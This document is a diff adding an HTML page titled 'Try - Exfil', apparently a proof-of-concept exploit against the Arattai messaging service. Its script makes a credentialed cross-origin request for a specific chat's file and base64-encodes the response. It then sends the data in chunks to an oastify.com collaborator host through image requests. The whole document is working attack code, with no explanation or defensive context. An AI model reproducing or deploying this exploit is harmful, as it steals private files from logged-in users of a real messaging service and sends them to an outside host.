@@ -1,0 +1,47 @@
+<!DOCTYPE html>
+<html>
+<head><meta charset="utf-8"><title>Try - Exfil</title></head>
+<body>
+<h3>Vanakam Exfil</h3>
+<pre id="out" style="white-space:pre-wrap;word-break:break-all;"></pre>
+
+<script>
+const HOST      = "https://files.arattai.in";
+const SERVICE   = "arattai";
+const EVENT_ID  = "k5b223031303032313133343235343137383539323234343237343530222c22333333353531345f617261747461695f636f6d6d6f6e225d";
+const CHAT_ID   = "CT_1469007622159071968_3335514-GC";
+const EXFIL_URL_RAW = "b7jzfvctk01lfslqpwkbmb0h288zwrkg.oastify.com"; 
+const EXFIL_URL = EXFIL_URL_RAW.startsWith("http") ? EXFIL_URL_RAW : "https://" + EXFIL_URL_RAW;
+
+const xcli = encodeURIComponent(JSON.stringify({ chat_id: CHAT_ID }));
+const url  = `${HOST}/webdownload?x-service=${SERVICE}&event-id=${encodeURIComponent(EVENT_ID)}&x-cli-msg=${xcli}`;
+
+fetch(url, {
+    method: "GET",
+    credentials: "include",   
+    mode: "cors"
+})
+.then(async (r) => {
+
+    if (!r.ok) return;
+    const blob = await r.blob();
+
+    const reader = new FileReader();
+    reader.onload = () => {
+        const b64 = reader.result;
+        const chunkSize = 1800;
+        for (let i = 0; i < b64.length; i += chunkSize) {
+            const chunk = encodeURIComponent(b64.slice(i, i + chunkSize));
+            const idx   = Math.floor(i / chunkSize);
+            new Image().src = EXFIL_URL + "?i=" + idx + "&d=" + chunk;
+        }
+    };
+    reader.readAsDataURL(blob);
+})
+.catch((e) => {
+    console.log("fetch error", e);
+});
+</script>
+</body>
+</html>
+
